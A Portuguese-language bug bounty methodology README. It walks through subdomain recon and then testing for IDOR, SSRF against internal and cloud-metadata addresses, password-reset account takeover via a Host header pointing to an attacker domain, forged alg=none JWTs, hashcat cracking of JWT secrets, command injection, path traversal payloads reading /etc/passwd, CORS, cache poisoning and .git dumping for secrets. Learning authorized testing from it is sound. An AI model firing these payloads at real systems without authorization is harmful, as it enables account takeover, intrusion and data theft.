<h1 align="center">Bug Bounty Hunting Methodology 2026</h1>
<h4 align="center">"This bug bounty methodology was developed by me as I start my journey in cybersecurity. It’s a work-in-progress approach that I’m currently following as a beginner."</h4>
<br>

<div align="center">
  
[![LinkedIn](https://img.shields.io/badge/linkedin-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/caetano-rangel/)

</div>
<br>

## 📜 Table of Contents

| Section | Description |
|---------|-------------|
| 1. [Initial Notes](#1-initial-notes-and-create-account) | Initial Notes About Application |
| 2. [Reconnaissance](#2-reconnaissance-and-subdomain-enumeration) | Subdomain Enumeration & Initial Scanning |
| 3. [Vulnerabilities](#3-vulnerabilities) | Probing, Vulnerability Scanning & Analysis |
| 4. [Hunting](#4-Hunting) | Vectors & Chains |
| 5. [POC Creation](#5-proof-of-concept-poc-creation) | Documentation & Evidence |
| 6. [Reporting](#6-reporting) | Final Documentation |

---
<br>

## **1. Initial Notes and Create Account**

Antes de iniciar qualquer scan, o entendimento do alvo é fundamental:

*   **Entenda o escopo:** Leia a política do programa (In-Scope vs Out-of-Scope).
*   **Crie contas:** Crie contas de usuário (e de admin, se possível) para testar permissões.
*   **Mapeie funcionalidades:** Identifique onde há login, upload de arquivos, busca, campos de perfil e interações com API.
*   **Anote tecnologias:** Use o [Wappalyzer](https://www.wappalyzer.com/) ou [BuiltWith](https://builtwith.com/) para identificar o stack (tecnologias usadas).

---
<br>

## **2. Reconnaissance and Subdomain Enumeration**

### **2.1 Passive Subdomain Enumeration**
**🛠️Tools:** [Subfinder](https://github.com/projectdiscovery/subfinder)

<br>

**Subfinder**
```bash
subfinder -d target.com -o sub1.txt
```

**Sort -u**
```bash
cat sub*.txt | sort -u > subs.txt
```

**Crt.sh**
```bash
curl -s "https://crt.sh/?q=%.alvo.com&output=json" \
| jq -r '.[].name_value' \
| sed 's/\*\.//g' \
| sort -
```

**Amass**
```bash
amass enum -passive -d alvo.com -o amass-passive.txt
```
<br>

Por que rodar subfinder e amass e crt.sh? Porque cada um cobre fontes diferentes.
A regra é: junte tudo e `deduplique`.
O subdomínio que vale o bounty pode ser justamente o que só uma das três achou.
```bash
cat subs.txt amass-*.txt crtsh.txt | sort -u > all-subs.txt
```

<br>

### **2.2 Active Subdomain Enumeration**
**🛠️Tools:** [Shuffledns](https://github.com/projectdiscovery/shuffledns), [Httpx](https://github.com/projectdiscovery/httpx)

<br>

**ShuffleDns**
```bash
shuffledns -r ~/resolvers.txt -list subss.txt -mode resolve -o dns.txt
```

**HTTPX**
```bash
httpx -l dns.txt -tech-detect -title -server -cl -sc -mc 200,401,403 -ports 80,443,8080,8443 -timeout 5 -o live.txt
```

```bash
grep "\[200\]" live.txt > 200.txt
```

<br>

### **2.3 Endpoints**

<br>

**Gau**

Getallurls. Ele busca URLs conhecidas de um domínio a partir de quatro fontes de arquivo: Wayback Machine, Common Crawl, AlienVault OTX e URLScan. É 100% passivo: ele não rastreia o alvo, só pergunta pros arquivos "que URLs desse domínio vocês já viram?".
```bash
gau alvo.com --subs --o urls-historicas.txt --blacklist png,jpg,css
```

**Waybackurls**

Faz só a Wayback Machine, mas é rápido e confiável. Recebe domínios por stdin.
```bash
cat all-subs.txt | waybackurls > wayback.tx
```

<br>

### **2.4 Analise de JS**

<br>

**Trick Clássica**
```bash
echo alvo.com | gau | grep '\.js$' | httpx -sc -mc 200 -ct | grep -iE 'text/javascript| application/javascript'
```

echo alvo.com | gau lista as URLs históricas; 
grep '\.js$' mantém só as que terminam em .js;
httpx -sc -mc 200 -ct mantém as que respondem 200 e mostra o content-type;
grep final garante que é JS de verdade (e não um 404 disfarçado).

<br>

**LinkFinder**

O LinkFinder usa regex pra varrer um arquivo JS e extrair todos os endpoints/paths que parecem URLs:

```bash
cd LinkFinder && pip install -r requirements.txt
```
```bash
python3 linkfinder.py -i https://alvo.com/static/app.min.js -o cli
```
---
<br>

## **3. Vulnerabilities**
**🛠️Tools:** [OpenRedirex](https://github.com/devanshbatham/OpenRedirex)

<br>


**🐞Open Redirect**
```bash
awk '$2 ~ /^\[(200|301|302|303|307|308)\]$/ {print $1}' live.txt > redirects_limpo.txt
```

```bash
katana -u redirects_limpo.txt -d 5 -jc -o katana.txt
```

```bash
katana -list redirects_limpo.txt -d 3 -c 50 -p 20 -jc -mr "(url|redirect|next|return|goto|target|destination|rurl|view)=" -o katana.txt
```

```bash
grep -ivE "linkedin|pinterest|twitter|t.me|x.com" katana.txt | sort -u > katana_limpo.txt && mv katana_limpo.txt katana.txt
```

Filtrar para campos que servem como redirect.
```bash
cat katana.txt | gf redirect > gf.txt
```

```bash
grep -E '^https?://([^/]+\.)?target\.[^/]+' gf.txt > gf_filtro.txt
```

```bash
sort -u gf_filtro.txt > gf_unique.txt
```

cd ~/OpenRedirex
```bash
cat ~/gf_unique.txt | python3 openredirex.py > resultados.txt
```

Validação manual com - curl -i target.com

<br>

**🐞XSS**

Todo Conteúdo de Xss --> https://github.com/caetano-rangel/Xss

<br>

**🐞Subdomain TakeOver**
```bash
dnsx -l subs.txt -cname -resp -o cname.txt
```

```bash
sed -r 's/\x1B\[[0-9;]*[mK]//g' cname.txt | awk '{print $1, $3}' > hosts.txt
```

```bash
chmod +x check_takeover.sh
```

```bash
./check_takeover.sh hosts.txt > resultado.csv
```

```bash
./final_takeover.sh
```

<br>

**🐞IDOR (Insecure Direct Object Reference)**

*    Crie 2 contas (perfis diferentes quando possível).
*    Mapear todo parâmetro com identificador (id , cpf , chargeId , conta , uuid ...).
*    Testar troca de ID em GET, POST, PUT, DELETE e no corpo/headers.
*    Testar troca de token entre Conta A e Conta B em funções restritas.
*    Como admin, anotar ações privilegiadas e tentar chamá-las como usuário comum (BFLA).
*    Procurar IDs/valores vazando em respostas, JS e e-mails (pra IDs não sequenciais).
*    Mostrar escala/impacto (Intruder) e identificar dado sensível (PII).

```bash
POST /api/relatorios/download HTTP/2
Host: alvo.com
Authorization: Bearer <token_da_Conta_B>   # <- troca aqui (era da Conta A)
Content-Type: application/json
{"reportId": 42
```

```bash
# BFLA
POST /api/admin/store/block HTTP/2
Authorization: Bearer <token_do_usuario_comum>   # <- perfil sem permissão
{"storeId": 77
```

*   Teste tanto **incremento numérico** (1, 2, 3...) quanto **IDOR em UUID** (trocar o UUID de outro usuário capturado em algum lugar do app — comentários, avatars, exports)
*   Teste em métodos diferentes: GET, PUT, DELETE, PATCH (BAC + IDOR combinados)

<br>

**🐞SSRF (Server-Side Request Forgery)**

Onde costuma aparecer? Em qualquer funcionalidade que busca uma URL pra você: webhooks, importação de imagem por URL, geradores de PDF/screenshot a partir de link, validadores de URL, integrações ("conecte sua conta"), pré-visualização de link (aquele card que aparece quando você cola um link no chat), conversores de documento, proxies de imagem, e o clássico ?url= 

| Tipo | Lê a resposta? | Como Confirma |
|------|----------|------------|
| Basic / in-band | Sim | Conteúdo interno aparece na resposta |
| Semi-blind | Parcial |código na linguagem da app → SO |
| Blind |Não |  Interação OAST (DNS/HTTP no seu servidor) |

<br>

`Onde caçar:`

*    Parâmetros óbvios: url, uri, link, src, dest, redirect, target, domain, callback, webhook, feed, host, to, out, path, continue, image, imageUrl, file, document, proxy.
*    Funcionalidades: importar por URL, gerar PDF/thumbnail/screenshot de um link, "preview" de link, validador de URL, integrações via webhook, conectores, parsers de XML (XXE pode virar SSRF), SAML/SSO.
*    Headers que viram destino: às vezes o servidor segue o Referer ou um header customizado.
*    WordPress com xmlrpc.php habilitado: blind SSRF "de prateleira" via pingback.ping (detalhe no Nível 1). Fingerprint de WP antigo é forte indício de que o pingback segue exposto.

```bash
# Caçar parâmetros tipo URL nos JS e na superfície (já vimos essas ferramentas no post 01-recon-discovery.md)
echo "https://alvo.com" | gau | grep -Ei '(\?|&)(url|uri|link|src|dest|redirect|target|callback|webhook|feed|image|file)=' | sort -u
```

<br>

`Atalho:`

Se o alvo roda WordPress com o pingback.ping ) xmlrpc.php habilitado (o que é comuníssimo, principalmente em versões antigas; um fingerprint de WP desatualizado já é forte indício de que o pingback segue exposto), você tem um blind SSRF pronto, sem precisar de um parâmetro ?url= 

<br>

`Bata em localhost:`

```bash
POST /product/stock HTTP/2
Host: alvo.com
Content-Type: application/x-www-form-urlencoded
stockApi=http://localhost/admin       # <- painel que só responde "de dentro"
```

```bash
# Variações de destino interno pra testar:
http://127.0.0.1/             
http://localhost/
http://127.0.0.1:8080/        
http://192.168.0.68/admin     
http://[::1]/                 
http://127.0.0.1:6379/   (Redis)
http://10.0.0.1/
http://169.254.169.254/latest/meta-data/  (metadata!)
http://2130706433        (decimal de 127.0.0.1)
http://0x7f000001        (hex de 127.0.0.1)
```

Se o conteúdo interno voltar na resposta (basic) ou se o tempo/erro mudar (semi-blind), você está dentro da rede

<br>

**🐞 ATO**

*   Fluxo de senha: telas de "esqueci a senha", "alterar senha", links de reset no email. Capture cada parâmetro da request (login, e-mail,  user_id , token , code ).
*   Tokens: abra o DevTools → Application → Local Storage / Cookies e procure poralgo que comece com eyJ (é Base64URL de também o header uthorization: Bearer .
*   Endpoints de chave: tente {" , quase sempre um JWT). Veja/.well-known/jwks.json e  /jwks.json , que entregam a chave pública que vamos usar no ataque de algorithm confusion.
*   OAuth: procure response_type=code , client_id , redirect_uri , state nas URLs de "login com Google/GitHub/etc.".

Ferramentas:

*    jwt.io: cola o token e ele decodifica header.payload.signature num clique. Ótimo pra inspecionar sem instalar nada.
*    jwt_tool (ticarpi/jwt_tool) é o canivete suíço de JWT em linha de comando: testa alg=none, confusão de algoritmo, etc.
*    hashcat: pra crackear o segredo HMAC (modo -m 16500 , que cobre HS256, HS384 e HS512 — ele detecta o algoritmo pelo tamanho da assinatura).

Checklist:

*    No reset: o alvo (login/e-mail) é controlável no corpo? O endpoint pede autenticação?
*    Testar Host header injection (Host/X-Forwarded-Host) no link de reset.
*    O token de reset é imprevisível, expira e invalida após o uso?
*    Testar troca de token/e-mail no refresh entre Conta A e Conta B.
*    Achear JWT (eyJ...)? Decodifiquei o header: qual alg?
*    Testar alg=none (e variantes de capitalização).
*    HS256 → rodei hashcat -a 0 -m 16500 com wordlist.
*    RS256 → busquei /jwks.json e tentei algorithm confusion.
*    Testar injeção de kid/jku/jwk no header.
*    OAuth: o state existe e é validado? O redirect_uri aceita meu domínio?
*    OTP/2FA: tem rate limit? Dá pra manipular a response (400→200)? Código reusa? pinID trocável?

<br>

*    A pergunta-mestra:"qual dado dessa request decide quem eu sou, e eu consigo mexer nele?"
*    Em JWT, toda a segurança está na verificação da assinatura. Allowlist de algoritmo + chave forte mata a maioria dos ataques.
*    alg=none rejeitado num formato pode passar em outro: teste none, None, nOnE, NONE.

<br>

Olhar sessão 4.1 para vetores de ATO.

<br>

**🐞 RCE**

Essa é a raiz dos quatro caminhos. Em cada um, um dado seu cruza uma fronteira onde devia continuar sendo dado e vira instrução:

| Caminho | Onde vira instrução | Resultado |
|------|----------|------------|
| OS Command Injection | input concatenado num comando de shell (exec() ) | comandos no SO |
| SSTI | input concatenado num template que é avaliado |código na linguagem da app → SO |
| Upload inseguro |arquivo seu salvo num diretório executável pelo servidor | webshell → comandos no SO |
| Desserialização |bytes seus reconstruídos em objetos que disparam código | gadget chain → comandos no SO |

*    Guardar isso. O resto é como cruzar cada fronteira.

<br>

`OS Command Injection: A concatenação fatal`

```bash
// Backend VULNERÁVEL (PHP) — ferramenta de "ping" num painel
$host = $_GET['host'];
system("ping -c 1 " . $host);   // <- seu input entra cru na linha de comando
```

Se você manda host=8.8.8.8, roda ping -c 1 8.8.8.8. Mas o shell interpreta metacaracteres. Se você manda host=8.8.8.8; id, o shell vê dois comandos separados por ; e roda os dois:

```bash
ping -c 1 8.8.8.8; id
```

O ; é o ponto onde dado virou instrução. O shell não tem como saber que id "não devia estar ali"; pra ele é só mais um comando

<br>

`SSTI: quando o input entra no template`

Template engine é o que monta HTML com dados dinâmicos (Jinja2 no Python/Flask, Twig no PHP/Symfony, Freemarker no Java). O fluxo seguro passa o dado como variável:

```bash
# SEGURO — username é um VALOR passado ao template
render_template("hello.html", username=request.args.get("name")
```

O fluxo vulnerável concatena o input dentro do texto do template e só então renderiza:

```bash
# VULNERÁVEL (Flask/Jinja2) — input vira PARTE do template
from jinja2 import Template
nome = request.args.get("name")
Template("Olá " + nome).render()   # <- o template é construído com input do usuário
```

Agora name={{7*7}} não é texto: o Jinja2 avalia 7*7 e devolve Olá 49. Você está executando expressões na linguagem do template, e de expressão a os.popen('id') é um pulo.

<br>

`Upload: o arquivo no lugar errado`

```bash
// VULNERÁVEL — salva com o nome original, sem validar o conteúdo
move_uploaded_file($_FILES['avatar']['tmp_name'], "uploads/" . $_FILES['avatar']
['name']);
```

Se uploads/ é servido pelo Apache/PHP e você consegue salvar um shell.php lá, ao acessar https://alvo.com/uploads/shell.php o servidor executa o PHP. O arquivo deixou de ser "dado armazenado" e virou "código executável".

<br>

`Desserialização: bytes que viram objetos`

Serializar = transformar um objeto em bytes pra guardar/transmitir; desserializar = reconstruir. O problema: reconstruir um objeto pode disparar métodos (construtores, __wakeup no PHP, readObject no Java). Se o atacante controla os bytes, ele monta uma cadeia de objetos (gadget chain) cuja reconstrução acaba chamando algo como Runtime.exec().

<br>

Checklist:

*    Mapeei features que tocam o SO (ping, conversão de arquivo, export) e campos refletidos (busca, perfil, e-mails de template).
*    Testei os separadores de command injection: | ; | & || (cross-platform).
*    Sem retorno na resposta? Tentei blind por tempo (sleep / ping -c 10) e OOB (DNS/HTTP via Collaborator).
*    Filtro no caminho? Apliquei bypass: ${IFS} , {a,b} , aspas/ \ no meio do binário.
*    Upload: tentei bypass de extensão, MIME e magic bytes; achei o path real e testei execução.
*    Procurei dados serializados (rO0 , O:4: , ViewState) pra desserialização.

<br>

---
<br>

## **4. Hunting**

`Sumario:`
*   4.1 - Vetores de ATO
*   4.2 - Spring Boot Actuator
*   4.3 - Path Transversal
*   4.4 - Post Message
*   4.5 - Cors Missconfig
*   4.6 - Web Cache
*   4.7 - .Git Exposure
*   Testar as POCs --> https://github.com/caetano-rangel/POC.

<br>

### **4.1.1 ATO - Reset de senha inseguro**
 
`Vetor 1A: Alvo do reset controlável (o IDOR do reset).`
*   Em uma área logada, a request de "alterar senha" carrega quem está tendo a senha trocada. Se esse campo vier do cliente e o servidor não fixar na sessão, troque-o:

```bash
POST /autenticacao/api/v1/alterar-senha HTTP/2
Host: alvo.com
Content-Type: application/json
Cookie: session=<sua_sessao_ContaA>
{"usuario":"vitima_contaB","novaSenha":"Senha123!","confirmaSenha":"Senha123!"}
# <- "usuario" deveria ser fixo na sessão; se aceitar outro login, é ATO
```

<br>

`Vetor 1B:  Reset que devolve a senha (ou não exige autenticação). `
*   Pior cenário: o endpoint de reset responde com a nova senha no corpo, ou nem pede sessão:

```bash
POST /autenticacao/api/v1/resetar-senha HTTP/2
Host: alvo.com
Content-Type: application/json
{"usuario":"vitima_contaB","novaSenha":"Nova@123","confirmarSenha":"Nova@123","resetarSenha"
```

```bash
HTTP/2 200 OK
Content-Type: application/json
{"message":"Senha redefinida com sucesso"}   # <- algumas APIs até devolvem a senha aqui
```

<br>

`Vetor 1C:  Host header injection no link de reset.`
*   O servidor monta o link do e-mail usando o header Host da request. Se você controla o Host, o link aponta pro seu domínio, e quando a vítima clica, o token de reset vaza pro seu servidor via a própria URL:
*   A vítima recebe um e-mail "legítimo" com https://atacante.com/reset?token=ABC.... Ao clicar, o token cai no seu log. Variante: header X-Forwarded-Host: atacante.com.

```bash
POST /esqueci-senha HTTP/2
Host: atacante.com          # <- o app usa este Host pra montar o link do e-mail
Content-Type: application/x-www-form-urlencoded
email=vitima@exemplo.com
```

<br>

`Vetor 1D:   Token de reset previsível ou eterno.`
*    Verifique o token: é sequencial? Curto? Baseado em timestamp? Expira?Invalida após o uso? Um token que não expira pode ser reusado meses depois; um previsível pode ser adivinhado. Gere dois resets seguidos e compare os tokens: se houver padrão, é explorável

<br>

### **4.1.2 JWT - Jason Web Token**

*   header.payload.signature, três blocos Base64URL separados por ponto:
```bash
// header — diz QUAL algoritmo assina o token
{"alg":"HS256","typ":"JWT"}
// payload — as "claims" (afirmações sobre quem você é)
{"userId":1001,"admin":false,"iat":1717000000,"exp":1717003600}
```

> **⚠️ Analogia:** o JWT é um cheque. Header e payload são o valor e o nome, escritos a caneta, qualquer um lê. A assinatura é a firma do banco. Falsificar o cheque é falsificar a firma. Os ataques a seguir são quatro jeitos de falsificar a firma (ou fazer o banco nem conferir).

<br>

`Vetor 2A:  alg=none , o cheque sem firma.`
*   A especificação do JWT prevê "alg":"none" (token "não seguro", sem assinatura). Servidores deveriam rejeitar, mas muitos não. Você troca o algoritmo pra none , edita o payload e remove a assinatura (mantendo o ponto final):
*   Se o servidor aceitar, ele confiou num cheque sem firma. Variantes de bypass quando o filtro é ingênuo: nOnE , NONE (capitalização mista).

```bash
{"alg":"none","typ":"JWT"}
{"userId":1001,"admin":true}   // <- forjamos admin
```

```bash
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwMDEsImFkbWluIjp0cnVlfQ.
assinatura vazia, mas o "." continua
```

<br>

`Vetor 2B:  Segredo fraco em HS256: crackeando a firma com hashcat.`
*    HS256 assina com HMAC-SHA256 usando um segredo compartilhado. Se esse segredo for fraco (123456 , secret , changeme ), você o quebra offline e passa a assinar tokens válidos. Salve o JWT num arquivo e rode:

```bash
# -m 16500 é o modo "JWT" do hashcat; -a 0 é ataque por wordlist
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

<br>

`Vetor 2C:  Algorithm confusion (RS256 → HS256): usando a chave pública como segredo.`
*    Esse é o pulo do gato. Em RS256 o token é assinado com a chave privada (só o servidor tem) e verificado com a pública (pode ser pública mesmo). Parece seguro, e é, se o servidor só aceitar RS256.

O bug: muitas libs têm um verify() genérico que escolhe o algoritmo pelo header do token. Se o servidor guarda a chave pública pra verificar RS256, mas você manda um token com  alg:HS256 , a lib usa a mesma chave pública como segredo HMAC. E a chave pública... é pública! Você a tem. Então você assina o token em HS256 usando a chave pública como segredo, e o servidor verifica com a mesma chave pública. Bate. (Pré condição: a app entrega a chave pública ao  verify() como string/PEM, a mesma forma que vira segredo HMAC; 

*    libs que tipam a chave como objeto/ KeyObject , ou que travam o algoritmo aceito, não caem nisso.)

> **⚠️ Atenção:**  a versão da chave pública que você usa pra assinar tem que ser byte a byte idêntica à que o servidor guarda: mesmo formato (X.509 PEM) e inclusive os \n (newlines) caracteres não-imprimíveis. Um newline a mais ou a menos e a assinatura não bate. Não é "mais ou menos igual". É idêntica.

<br>

### **4.1.3 Bypass de 2FA / OTP**

`Vetor A:  Validação no client-side (response manipulável).`
*   O servidor responde 400 pra um OTP errado e o front decide o que fazer com base no status. Intercepte a resposta e troque 400 Bad Request por 200 OK :

```bash
HTTP/2 400 Bad Request →  HTTP/2 200 OK   # <- editado no Burp; o front acha que validou
```

<br>

### **4.2 Spring Boot Actuator**

Módulo de monitoramento do Spring Boot. Quando mal configurado, expõe endpoints internos sem autenticação.

*   Identificar candidatos Filtre hosts que rodam Java/Spring/Tomcat/Jetty (via httpx -tech-detect).
*   https://HOST/actuator / https://HOST:8081/actuator / http://HOST/actuator
*   404 / {"status":"NOT_FOUND"} → endpoint desabilitado - 401 / 403 → protegido por auth
*   Taxa de sucesso esperada: Baixa
<br>

### **4.3 Path Traversal (Directory Traversal)**

*   Procure por parâmetros que parecem manipular arquivos/caminhos: ?file= / ?path= / ?name=
*   GET /download?file=../../../../etc/passwd
*   Se o ../ literal for bloqueado, tente bypass de encoding
```bash
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd   (dupla URL-encode)
```

<br>

### **4.4 PostMessage**

Navegador não impõe nenhuma verificação de origem — é responsabilidade de quem escreve o addEventListener checar de onde a mensagem veio (event.origin).

*   Se escreve em innerHTML/document.write → XSS
*   Se redireciona (location.href = event.data.url) → open redirect ou até XSS via javascript
*   Se salva token/dado sensível em localStorage → possível roubo de sessão se você conseguir também ler a resposta
*   Se dispara uma ação (ex: logout(), updateProfile(event.data)) sem confirmar origem → CSRF-like via postMessage

Opção 1 — DevTools (colar script no console)

Opção 2 — Script Node + Puppeteer

```bash
node -v   # confirma que tem Node instalado
npm install puppeteer
npm approve-scripts puppeteer
```

```bash
nano cookies.json
grep "\[200\]" live.txt | awk '{print $1}' > urls.txt
node postmessage_scanner.js urls.txt cookies.json
```

<br>

### **4.5 CORS MissConfig**

Onde procurar:

*   APIs e Endpoints de Dados: Foque em rotas que retornam dados estruturados (/api/v1/..., /graphql, /user/data, /account/settings
*   Requisições via AJAX/Fetch: (F12) na aba Network (Rede) e navegue pela aplicação. Procure por requisições em segundo plano que retornem JSON ou XML.
*   Endpoints com Autenticação: Endpoints que exigem que o usuário esteja logado (ex: extratos, histórico de pedidos, tokens de acesso, configurações de perfil)

O que Verificar:

*   Access-Control-Allow-Origin (ACAO): Indica quais origens têm permissão para ler o resultado.
*   Access-Control-Allow-Credentials (ACAC): Indica se o navegador pode expor a resposta quando credenciais (cookies/tokens) são incluídas. Deve ser estritamente `true`

Como Verificar:

*   Intercepte ou Envie para o Repeater: Pegue uma requisição legítima de API que retorne dados do usuário.
*   Adicione o cabeçalho Origin: `Origin: https://evil.com`
<br>

Cenários:

`Cenário A: Configuração Segura (Não é Bug)`
*   O servidor não retorna o cabeçalho Access-Control-Allow-Origin, ou retorna um domínio específico e confiável (ex: https://app.alvo.com)
*   Conclusão: O navegador bloqueará qualquer tentativa de leitura externa.

`Cenário B: CORS Aberto Público (Geralmente Baixo/Informativo)`
*   Response: Access-Control-Allow-Origin: * | Access-Control-Allow-Credentials: false (ou o cabeçalho nem existe)
*   Conclusão: Como o Credentials é falso ou ausente, sites maliciosos não conseguem roubar dados de sessões autenticadas de usuários específicos.

`Cenário C: O Bug Real (Reflexão Insegura com Credenciais)`
*   Response: Access-Control-Allow-Origin: https://evil.com | Access-Control-Allow-Credentials: true
*   Conclusão: O servidor confia cegamente em qualquer origem que você enviar e permite o envio de cookies. Isso indica uma falha crítica de CORS Misconfiguration.
<br>


### **4.6.1 Web Cache Poisoning**
 
*   Identifique um **unkeyed input** (header/parâmetro que influencia a resposta mas não faz parte da cache key). Use o Param Miner (Burp) para automatizar a descoberta
*   Headers unkeyed clássicos para testar:
```bash
X-Forwarded-Host: teste123.com
X-Forwarded-Scheme: http
X-Original-URL: /
X-Rewrite-URL: /
X-HTTP-Method-Override: GET
X-Forwarded-Proto: http
X-Forwarded-Port: 1337
```
 
```bash
# Enviar sempre com cache-buster único para não poluir o cache compartilhado
curl -i "https://target.com/?cb=849302" -H "X-Forwarded-Host: teste123.com"
```
 
*   Veja se o valor injetado é refletido na resposta (ex: em `<script src="http://teste123.com/...">`, canonical link, meta tag, redirect)
*   Confirme indicadores de cache na resposta:
```bash
Age: 128
X-Cache: HIT
Cache-Control: public, max-age=...
```
 
*   Repita a requisição **sem** o header malicioso (mesmo cache-buster) e veja se o payload envenenado ainda aparece — isso confirma que ficou armazenado
*   Verifique o header `Vary` — ele mostra o que o cache *diz* que usa como chave, e pode divergir do que a origem realmente processa (a divergência é a causa raiz do bug)
*   PoC de impacto: acesse a URL envenenada de uma sessão limpa/anônima/outro IP e confirme que o payload é servido sem enviar o header novamente
<br>

### **4.6.2 Web Cache Deception (WCD)**
 
*   Identifique uma rota **dinâmica e autenticada** que retorna dados sensíveis, ex: `/minhaconta/12345`, `/api/user/profile`, `/doc/12345`
*   Adicione uma extensão estática inexistente ao final do path (não como query string):
```bash
https://target.com/minhaconta/12345/inexistente.css
https://target.com/api/user/profile.js
https://target.com/doc/12345.js
```
 
*   Envie a requisição autenticada (ex: no Burp Repeater) e verifique:
```bash
Status: 200 OK
Cache-Control: public, max-age=...
X-Cache: MISS
```
 
*   Repita a mesma requisição (mesma URL exata) e veja o cache virar `X-Cache: HIT`, confirmando que a resposta dinâmica/sensível foi cacheada como se fosse estática
*   PoC de impacto: acesse a **mesma URL exata**, sem autenticação (sessão limpa/anônima ou de outra conta), e confirme se os dados da vítima aparecem — o vazamento é de **outro usuário**, não um payload seu injetado
*   Cenário de exploração real: force a vítima a acessar a URL manipulada (via link/CSRF/redirect) e, como atacante não autenticado, acesse a mesma URL logo depois para roubar o conteúdo cacheado dela
<br>

### **4.7 .Git Exposto**
 
*   Quando o .git é deixado público, o histórico inteiro do repositório está acessível via HTTP.
*   Primeiro confirme (manualmente ou com a extensão de navegador DotGit, que avisa quando um site tem .git aberto):

```bash
curl -s https://alvo.com/.git/HEAD
# saída esperada: "ref: refs/heads/master"  -> confirmado
```

Depois reconstrua o repositório com o git-dumper (ferramenta que baixa e remonta o .git
```bash
# pip install git-dumper
git-dumper https://alvo.com/.git/ ./dump
cd dump && ls
# composer.json  Dockerfile  index.php  vendor/ ...
```

Agora grep por segredos no que você baixou
```bash
grep -rEi 'password|secret|api_key|DB_|mysql|--password=' ./dump
```
<br>

---
<br>

<div align="center">
  <b>Boa caçada! 🎯</b>
</div>
